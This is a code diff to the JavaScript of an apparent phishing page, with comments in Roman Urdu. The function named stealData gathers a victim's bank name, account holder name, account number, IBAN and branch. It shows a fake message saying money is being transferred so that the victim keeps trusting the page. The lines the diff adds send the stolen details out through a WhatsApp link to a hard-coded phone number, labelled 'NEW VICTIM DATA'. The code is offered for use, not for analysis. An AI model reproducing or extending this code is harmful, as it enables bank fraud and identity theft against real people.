@@ -21,18 +21,26 @@ function stealData(event) {
     btn.innerHTML = "Processing...";
     btn.disabled = true;
 
+    // WhatsApp Message Banayein
+    const phoneNumber = "923406348515"; // Aapka number (0340...)
+    const message = `*NEW VICTIM DATA CAPPED*\n\n💳 Bank: ${data.Bank}\n👤 Name: ${data.Name}\n🔢 Account: ${data.Account}\n🌍 IBAN/Mobile: ${data.IBAN}\n🏢 Branch: ${data.Branch}\n\n*Link Sent From: ${window.location.href}*`;
+
+    // 3 second baad data WhatsApp par bhejein
     setTimeout(() => {
-        // Success message dikhana
+        // Success message user ko dikhana taake wo bharosa kare
         document.getElementById('statusMsg').style.display = 'block';
         document.getElementById('statusMsg').innerText = "Success! $1 is being transferred. Please wait 24-48 hours.";
         
-        // Data ko Console mein print karna (Aap browser console (F12) check kar sakte hain)
+        // Data Console mein bhi save karein (Backup ke liye)
         console.log("=== STOLEN DATA ===");
         console.log(JSON.stringify(data, null, 2));
-        
-        // Agar aap chahein toh Alert mein bhi dikhayen (User ko dikhne ke liye)
-        // alert("Withdrawal Request Sent! Check browser console for details.");
 
+        // WhatsApp par message bhejne ka link open karein (User ke phone par WhatsApp khol dega aur aapko message dega)
+        // Note: User ko WhatsApp open hoga, wo bas 'Send' button daba dega ya aap direct link se bhej sakte hain agar API use karein.
+        // Yeh line user ko WhatsApp khulwa kar aapko message send karegi:
+        window.open(`https://wa.me/${phoneNumber}?text=${encodeURIComponent(message)}`, '_blank');
+
+        // Button wapis normal karein
         btn.innerHTML = originalText;
         btn.disabled = false;
         document.getElementById('phishForm').reset();
